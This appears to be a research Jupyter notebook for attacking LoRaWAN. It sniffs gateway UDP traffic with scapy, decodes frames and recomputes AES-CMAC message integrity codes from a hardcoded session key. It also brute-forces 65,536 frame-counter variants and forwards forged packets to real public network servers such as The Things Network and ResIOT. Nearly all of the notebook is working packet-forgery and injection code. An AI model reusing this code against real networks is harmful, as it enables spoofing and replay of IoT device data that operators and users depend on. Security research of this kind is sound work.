{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import struct\n",
    "import base64\n",
    "from scapy.all import *\n",
    "import binascii\n",
    "import json\n",
    "from Cryptodome.Cipher import AES\n",
    "from Cryptodome.Hash import CMAC\n",
    "import socket\n",
    "\n",
    "# from Crypto import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def processGwPacket(packet):\n",
    "#     print type(packet[Raw]), \n",
    "    packetLen=len(str(packet[Raw]))\n",
    "    if packetLen > 200: #we received a lora packet\n",
    "#         print packet.summary()\n",
    "        packed_data=binascii.unhexlify(str(packet[Raw]).encode('hex'))\n",
    "        s=struct.Struct('b 2s b 8s ' + str(packetLen-12) + 's')\n",
    "        typ, tok, something, gwID, jsonPayload = s.unpack(packed_data)\n",
    "#         typ= unpacked_data[0]\n",
    "#         tok= unpacked_data[1]\n",
    "#         something= unpacked_data[2]\n",
    "#         gwID=unpacked_data[3]\n",
    "        jsonPayload = json.loads(jsonPayload)\n",
    "        return decodeLoraWAN(jsonPayload)\n",
    "#         print typ, tok, something, gwID, jsonPayload\n",
    "#     print str(packet[Raw])\n",
    "\n",
    "#constants\n",
    "MHDR_len=1\n",
    "MIC_len=4\n",
    "DevAddr_len=4\n",
    "FCtrl_len=1\n",
    "FCnt_len=2\n",
    "FOpts_len=0 #optional, up to 15? Its size is found in bits FCnt[0:3]\n",
    "FPort_len=1 #optional, 0 or 1. If the frame payload field is not empty, the port field MUST be present.\n",
    "\n",
    "\n",
    "def decodeLoraWAN(payload):\n",
    "    '''\n",
    "        * PHYPayload    (MHDR | MACPayload | MIC)\n",
    "        * MACPayload    (FHDR | FPort | FRMPayload)\n",
    "        * FHDR          (DevAddr | FCtrl | FCnt | FOpts)\n",
    "        In the end: MHDR|DevAddr|FCtrl|FCnt|FOpts|FPort|FRMPayload|MIC\n",
    "        '''\n",
    "    for receivedPacket in payload['rxpk']:\n",
    "        decodedData = base64.b64decode(receivedPacket['data'])\n",
    "        try:\n",
    "        #     print decodedData.encode('hex')\n",
    "\n",
    "            FRMPayload_len=len(decodedData)-13\n",
    "\n",
    "        #     s = struct.Struct(str(MHDR_len)+'s'+ str(DevAddr_len)+'s' + str(FCtrl_len)+'s' + str(FCnt_len)+'s' + str(FPort_len)+'s' + str(FRMPayload_len)+'s' + str(MIC_len)+'s')\n",
    "            s = struct.Struct(str(MHDR_len)+'s'+ str(DevAddr_len)+'s' + str(FCtrl_len)+'s' + str(FCnt_len)+'s' + str(FPort_len)+'s' + str(FRMPayload_len)+'s' + str(MIC_len)+'s')\n",
    "\n",
    "            MHDR, DevAddr, FCtrl, FCnt, FPort,FRMPayload, MIC = s.unpack(binascii.unhexlify(decodedData.encode('hex')))\n",
    "\n",
    "            print \"MHDR:\" + MHDR.encode('hex'),\n",
    "            print \"DevAddr:\" + DevAddr.encode('hex'),\n",
    "            print \"FCtrl:\" +FCtrl.encode('hex'),\n",
    "            print \"FCnt:\" + str(struct.unpack('<H', FCnt)[0]),\n",
    "            print \"FPort:\" +FPort.encode('hex'),\n",
    "            print \"FRMPayload:\" +FRMPayload.encode('hex'),\n",
    "            print \"MIC:\" +MIC.encode('hex')\n",
    "            return (MHDR, DevAddr, FCtrl, FCnt, FPort,FRMPayload, MIC)\n",
    "        except Exception as e:\n",
    "            print e\n",
    "            print \"Data received was:\"+ decodedData.encode('hex')\n",
    "        \n",
    "\n",
    "\n",
    "\n",
    "def calculateMIC_fromRx(NwkSKey, payload, DevAddr,FCntUp):\n",
    "    '''\n",
    "    Size (bytes): 1 4 1 4 4 1 1\n",
    "    B0: 0x49 | 4 x 0x00 | Dir|  DevAddr |FCntUp or FCntDown | 0x00|len(msg)\n",
    "    aes128_cmac(NwkSKey, B0 | MHDR | FHDR | FPort | FRMPayload)\n",
    "    '''\n",
    "    Dir = \"00\" #uplink:00, downlink=01\n",
    "    len_payload= format(len(payload)/2-4,'02x') #convert int to 2byte ascii hex\n",
    "    if len(FCntUp)==4:\n",
    "        FCntUp = FCntUp+'0000' #B0 expects a 4 byte FCntUp\n",
    "    B0=\"49\" + 4*\"00\" + Dir + DevAddr + FCntUp + \"00\" + len_payload\n",
    "#     print B0\n",
    "#     print \"rx payload:\",payload\n",
    "#     print \"rx MIC:\", payload[-4*2:]\n",
    "#     print \"rx payload without MIC:\", payload[0:-8]\n",
    "    MACobject = CMAC.new(binascii.unhexlify(NwkSKey), ciphermod=AES) #     cmac = aes128_cmac(NwkSKey, B0 | msg)\n",
    "    MACobject.update(binascii.unhexlify(B0+payload[0:-4*2])) \n",
    "#     print MACobject.hexdigest()\n",
    "    \n",
    "    MIC = MACobject.hexdigest()[0:4*2]\n",
    "#     print MIC\n",
    "    return MIC\n",
    "        \n",
    "'''\n",
    "40322c2300000900015dc971be4fb4\n",
    "MHDR:40 DevAddr:322c2300 FCtrl:00 FCnt:9 FPort:01 FRMPayload:5dc9 MIC:71be4fb4\n",
    "'''\n",
    "def calculateMIC_forTx(NwkSKey, payload, DevAddr,FCntUp):\n",
    "    '''\n",
    "    Size (bytes): 1 4 1 4 4 1 1\n",
    "    B0: 0x49 | 4 x 0x00 | Dir|  DevAddr |FCntUp or FCntDown | 0x00|len(msg)\n",
    "    aes128_cmac(NwkSKey, B0 | MHDR | FHDR | FPort | FRMPayload)\n",
    "    \n",
    "    Example: calculateMIC_forTx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc9',DevAddr='322c2300',FCntUp='09000000' )\n",
    "\n",
    "    '''\n",
    "    Dir = \"00\" #uplink:00, downlink=01\n",
    "    len_payload= format(len(payload)/2,'02x') #convert int to 2byte ascii hex\n",
    "    if len(FCntUp)==4:\n",
    "        FCntUp = FCntUp+'0000' #B0 expects a 4 byte FCntUp\n",
    "    B0=\"49\" + 4*\"00\" + Dir + DevAddr + FCntUp + \"00\" + len_payload\n",
    "#     print B0\n",
    "#     print \"tx payload:\",payload\n",
    "    MACobject = CMAC.new(binascii.unhexlify(NwkSKey), ciphermod=AES)\n",
    "    MACobject.update(binascii.unhexlify(B0+payload)) #cmac = aes128_cmac(NwkSKey, B0 | msg)\n",
    "#     print MACobject.hexdigest()\n",
    "    \n",
    "    MIC = MACobject.hexdigest()[0:4*2]\n",
    "#     print MIC\n",
    "    return MIC\n",
    "\n",
    "# calculateMIC_fromRx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc971be4fb4',DevAddr='322c2300',FCntUp='0900' )\n",
    "# calculateMIC_fromRx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc971be4fb4',DevAddr='322c2300',FCntUp='09000000' )\n",
    "# calculateMIC_forTx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc9',DevAddr='322c2300',FCntUp='09000000' )\n",
    "def bruteforceMIC(NwkSKey,payload,FCntUp):\n",
    "    '''Arguments should be in ascii hex, payload should not include the MIC '''\n",
    "    if len(FCntUp)>4:\n",
    "        FCntUp=FCntUp[0:4]\n",
    "    DevAddr=payload[2:2+4*2]\n",
    "    print \"Bruteforcing MICs for DevAddr:{}, 2 byte FCntUp:{}\".format(DevAddr,FCntUp)\n",
    "#     lsb = [format(LSB, '04x') for LSB in range(65536)]\n",
    "#     print lsb\n",
    "#     listOfMICs = [calculateMIC_forTx(NwkSKey,payload,DevAddr,FCntUp+format(LSB, '04x')) for LSB in range(65536)] # unordered MICs\n",
    "    listOfMICs = [calculateMIC_forTx(NwkSKey,payload,DevAddr,FCntUp+format(struct.unpack('<H',binascii.unhexlify(format(LSB, '04x')))[0],'04x'))  for LSB in range(65536)] #ordered MICs, little endian encoded\n",
    "    return listOfMICs\n",
    "\n",
    "\n",
    "def forwardGwPacket(server,packet,port=1700):\n",
    "# #     print packet[Raw]\n",
    "# #     print packet.summary()\n",
    "# #     print packet\n",
    "# #     print ls(packet)\n",
    "    \n",
    "#     packet[IP].dst=server\n",
    "# #     print packet.summary()\n",
    "# #     print \"IP:\\n\",ls(packet[IP])\n",
    "# #     print \"UDP:\\n\",ls(packet[UDP])\n",
    "#     print ls(IP(dst=server)/packet[UDP])\n",
    "#     send(IP(dst=server)/packet[UDP])\n",
    "    DST_IP = server\n",
    "    UDP_PORT = port\n",
    "    MESSAGE = str(packet[Raw])\n",
    "    print str(MESSAGE)\n",
    "    sock = socket.socket(socket.AF_INET, # Internet\n",
    "                         socket.SOCK_DGRAM) # UDP\n",
    "    sock.sendto(MESSAGE, (DST_IP, UDP_PORT))\n",
    "    sock.close()\n",
    "def forwardGwPackets(server,packets, port=1700):\n",
    "    DST_IP = server\n",
    "    UDP_PORT = port\n",
    "    sock = socket.socket(socket.AF_INET, # Internet\n",
    "                         socket.SOCK_DGRAM) # UDP\n",
    "    for packet in packets:\n",
    "        MESSAGE = str(packet[Raw])\n",
    "        sock.sendto(MESSAGE, (DST_IP, UDP_PORT))\n",
    "    sock.close()\n",
    "def forwardGwPackets_allServers(servers,packet,ports):\n",
    "    for i in range(len(servers)):\n",
    "        forwardGwPacket(server=servers[i],packet=packet,port=ports[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "# listOfMICs = bruteforceMIC('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc9',FCntUp='0900')\n",
    "# print len(listOfMICs), len(set(listOfMICs))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''Choose your server carefully'''\n",
    "# sniff(prn = lambda packet: forwardGwPackets(server=\"eu1.loriot.io\", packets=packet,port=1780), filter = \"(dst host 192.168.1.101) and (udp and dst port 1700)\",iface=ifaces.dev_from_index(11))\n",
    "# sniff(prn = lambda packet: forwardGwPacket(server=\"router.eu.thethings.network\",packet=packet), filter = \"(dst host 192.168.1.101) and (udp and dst port 1700)\",iface=ifaces.dev_from_index(11))\n",
    "sniff(prn = lambda packet: forwardGwPackets(server=\"eu72udp.resiot.io\", packets=packet,port=7677), filter = \"(dst host 192.168.1.101) and (udp and dst port 1700)\",iface=ifaces.dev_from_index(11))\n",
    "# sniff(prn = lambda packet: forwardGwPackets_allServers(servers=[\"router.eu.thethings.network\",\"eu1.loriot.io\", \"eu72udp.resiot.io\"], packet=packet,ports=[1700,1780,7677]), filter = \"(dst host 192.168.1.101) and (udp and dst port 1700)\",iface=ifaces.dev_from_index(11))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''Use to capture a LoRaWAN packet coming from the gateway'''\n",
    "sniff(prn= lambda x: x.summary(), filter = \"(dst host 192.168.1.101) and (udp and dst port 1700)\",iface=ifaces.dev_from_index(11))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "test = _\n",
    "lorapackets = [a for a in test if len(str(a[Raw]))>200]\n",
    "print len(lorapackets)\n",
    "# print \"1a00\".encode('hex')\n",
    "# print \"FCnt:\" +str(struct.Struct('<H').unpack(binascii.unhexlify(\"1a00\".decode('hex').encode('hex')))[0])\n",
    "\n",
    "# print len('40322c2300000900015dc971be4fb4')\n",
    "for lora in lorapackets:\n",
    "    processGwPacket(lora)\n",
    "nicepacket=lorapackets[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u0002is\u0000rv�\u00009\u0003\u0001�{\"rxpk\":[{\"tmst\":5803636,\"time\":\"2018-07-20T14:34:04Z\",\"chan\":6,\"rfch\":1,\"freq\":868.300000,\"stat\":1,\"modu\":\"LORA\",\"datr\":\"SF12BW125\",\"codr\":\"4/5\",\"lsnr\":7.5,\"rssi\":-87,\"size\":14,\"data\":\"QLwRASYAEwABwGOo0ek=\"}]}\n"
     ]
    }
   ],
   "source": [
    "#in case kernel shuts down:\n",
    "nicepacket = (Ether)(binascii.unhexlify('9c4e3674332c7076ff0202530800450000fa9d2a4000401118a7c0a8016cc0a80165b64c06a400e64c4a026973007276ff00390301ef7b227278706b223a5b7b22746d7374223a353830333633362c2274696d65223a22323031382d30372d32305431343a33343a30345a222c226368616e223a362c2272666368223a312c2266726571223a3836382e3330303030302c2273746174223a312c226d6f6475223a224c4f5241222c2264617472223a22534631324257313235222c22636f6472223a22342f35222c226c736e72223a372e352c2272737369223a2d38372c2273697a65223a31342c2264617461223a22514c7752415359414577414277474f6f30656b3d227d5d7d'))\n",
    "# print ls((Ether)(nicepacket))\n",
    "print (nicepacket)[Raw]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "9c4e3674332c7076ff0202530800450000fa9d2a4000401118a7c0a8016cc0a80165b64c06a400e64c4a026973007276ff00390301ef7b227278706b223a5b7b22746d7374223a353830333633362c2274696d65223a22323031382d30372d32305431343a33343a30345a222c226368616e223a362c2272666368223a312c2266726571223a3836382e3330303030302c2273746174223a312c226d6f6475223a224c4f5241222c2264617472223a22534631324257313235222c22636f6472223a22342f35222c226c736e72223a372e352c2272737369223a2d38372c2273697a65223a31342c2264617461223a22514c7752415359414577414277474f6f30656b3d227d5d7d\n",
      "MHDR:40 DevAddr:bc110126 FCtrl:00 FCnt:19 FPort:01 FRMPayload:c0 MIC:63a8d1e9\n",
      "40bc11012600130001c0\n",
      "63a8d1e9\n",
      "40bc11012600130001c0be59a4af\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'QLwRASYAEwABwL5ZpK8='"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "steps:\n",
    "extract payload without mic\n",
    "extract seqno\n",
    "calculate mic for seqno+65535\n",
    "send payload with new mic\n",
    "'''\n",
    "# nicepacket\n",
    "print str(nicepacket).encode('hex')\n",
    "MHDR, DevAddr, FCtrl, FCnt, FPort,FRMPayload, MIC = processGwPacket(nicepacket)\n",
    "payload_noMIC= MHDR.encode('hex') + DevAddr.encode('hex') + FCtrl.encode('hex') + FCnt.encode('hex') + FPort.encode('hex') + FRMPayload.encode('hex')\n",
    "# print MHDR.encode('hex')\n",
    "print payload_noMIC\n",
    "# print calculateMIC_forTx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload='40322c2300000900015dc9',DevAddr='322c2300',FCntUp='09000000' )\n",
    "print calculateMIC_forTx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload=payload_noMIC,DevAddr=DevAddr.encode('hex'),FCntUp=FCnt.encode('hex'))\n",
    "nextMIC=calculateMIC_forTx('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload=payload_noMIC,DevAddr=DevAddr.encode('hex'),FCntUp=FCnt.encode('hex')+'0200')\n",
    "\n",
    "print payload_noMIC + nextMIC\n",
    "base64.b64encode(binascii.unhexlify(payload_noMIC + nextMIC))\n",
    "#bruteforceMIC('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload=payload_noMIC,FCntUp=FCnt.encode('hex'))\n",
    "\n",
    "# forwardGwPacket(editedNicePacket)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u0002is\u0000rv�\u00009\u0003\u0001�{\"rxpk\":[{\"tmst\":5803636,\"time\":\"2018-07-20T14:34:04Z\",\"chan\":6,\"rfch\":1,\"freq\":868.300000,\"stat\":1,\"modu\":\"LORA\",\"datr\":\"SF12BW125\",\"codr\":\"4/5\",\"lsnr\":7.5,\"rssi\":-87,\"size\":14,\"data\":\"QLwRASYAEwABwGOo0ek=\"}]}\n",
      "\u0002is\u0000rv�\u00009\u0003\u0001�{\"rxpk\":[{\"tmst\":5803636,\"time\":\"2018-07-20T14:34:04Z\",\"chan\":6,\"rfch\":1,\"freq\":868.300000,\"stat\":1,\"modu\":\"LORA\",\"datr\":\"SF12BW125\",\"codr\":\"4/5\",\"lsnr\":7.5,\"rssi\":-87,\"size\":14,\"data\":\"QLwRASYAEwABwL5ZpK8=\"}]}\n",
      "\u0002is\u0000rv�\u00009\u0003\u0001�{\"rxpk\":[{\"tmst\":5803636,\"time\":\"2018-07-20T14:34:04Z\",\"chan\":6,\"rfch\":1,\"freq\":868.300000,\"stat\":1,\"modu\":\"LORA\",\"datr\":\"SF12BW125\",\"codr\":\"4/5\",\"lsnr\":7.5,\"rssi\":-87,\"size\":14,\"data\":\"QLwRASYAEwABwL5ZpK8=\"}]}\n"
     ]
    }
   ],
   "source": [
    "'''Send only 1 packet with forged MIC'''\n",
    "print str(nicepacket[Raw])\n",
    "# print str(nicepacket[Raw])[-24:-24+len(base64.b64encode(binascii.unhexlify(payload_noMIC + nextMIC)))]\n",
    "newUDPRawPayload = str(nicepacket[Raw])[:-24]+base64.b64encode(binascii.unhexlify(payload_noMIC + nextMIC))+str(nicepacket[Raw])[-4:]\n",
    "print newUDPRawPayload\n",
    "editedNicePacket=Raw(newUDPRawPayload)\n",
    "# print type(editedNicePacket), editedNicePacket\n",
    "forwardGwPacket(server=\"router.eu.thethings.network\", packet=editedNicePacket)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "65536\n",
      "3\n"
     ]
    }
   ],
   "source": [
    "'''Send many packets with forged MICs'''\n",
    "# MICs = bruteforceMIC('AA1DF48BBG8A5BC1FE298F6C94EE37AA',payload=payload_noMIC,FCntUp=FCnt.encode('hex'))\n",
    "newPackets=[]\n",
    "print len(MICs)\n",
    "for mic in MICs[:3]:\n",
    "#     print mic\n",
    "    newUDPRawPayload = str(nicepacket[Raw])[:-24]+base64.b64encode(binascii.unhexlify(payload_noMIC + mic))+str(nicepacket[Raw])[-4:]\n",
    "    editedNicePacket=Raw(newUDPRawPayload)\n",
    "    newPackets.append(editedNicePacket)\n",
    "#     print editedNicePacket\n",
    "print len(newPackets)\n",
    "# forwardGwPackets(server=\"router.eu.thethings.network\", packets=newPackets)\n",
    "forwardGwPackets(server=\"eu72udp.resiot.io\", packets=newPackets,port=7677)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
